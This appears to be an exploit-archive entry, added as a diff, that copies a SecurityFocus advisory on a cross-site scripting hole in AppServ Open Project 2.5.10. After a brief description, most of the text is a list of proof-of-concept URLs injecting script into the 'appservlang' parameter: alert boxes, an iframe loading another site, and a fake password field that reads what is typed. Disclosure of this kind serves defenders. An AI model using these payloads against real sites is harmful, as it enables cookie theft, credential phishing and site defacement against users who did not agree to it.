@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/29291/info
+
+AppServ Open Project is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+AppServ Open Project 2.5.10 is vulnerable; other versions may also be affected.
+
+http://www.example.com/index.php?appservlang=">[XSS] http://www.example.com/index.php?appservlang="><IMG%20SRC=java script:alert(/XSS/)> http://www.example.com/index.php?appservlang="><BODY%20ONLOAD=alert(/ xss/)> http://www.example.com/index.php?appservlang="><script>window.open(/phpinfo.php/)</script> http://www.example.com/index.php?appservlang="><INPUT%20TYPE="xss"> http://www.example.com/index.php?appservlang="><iframe%20src=http://www.example2.com> http://www.example.com/index.php?appservlang="><BR><input%20type%20=%20"password"%20name="pass"/><button%20onClick="java script:alert(/I%20have%20your%20password:%20/%20+%20pass.value);">Submit</button><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR> 
